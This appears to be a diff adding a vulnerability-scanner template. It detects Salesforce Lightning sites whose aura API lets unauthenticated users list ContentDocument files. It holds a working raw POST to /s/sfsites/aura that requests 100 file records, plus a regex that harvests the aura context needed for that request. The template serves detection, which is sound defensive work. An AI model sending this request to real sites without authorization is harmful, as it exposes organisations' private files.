@@ -1,0 +1,37 @@
+id: salesforce-contentdocument-detector
+
+info:
+  name: Salesforce ContentDocument Detector
+  author: TedJackson
+  severity: Medium
+  description: A Salesforce Lightning aura API allows unathenticated users to fetch files.
+  tags: aura,unauth,salesforce,exposure,misconfig
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/s/"
+
+    extractors:
+      - type: regex
+        group: 1
+        name: auracontext
+        part: body
+        internal: true
+        regex:
+          - "\\/s\\/sfsites\\/l\\/([a-zA-Z0-9\\-_~.%]+)\\/[^\\/]+\\.js"
+
+  - raw:
+      - |
+        POST /s/sfsites/aura HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context={{auracontext}}&aura.pageURI=%2Fs%2F&aura.token=null
+
+    matchers:
+      - type: word
+        words:
+          - '"state":"SUCCESS",'
+        part: body
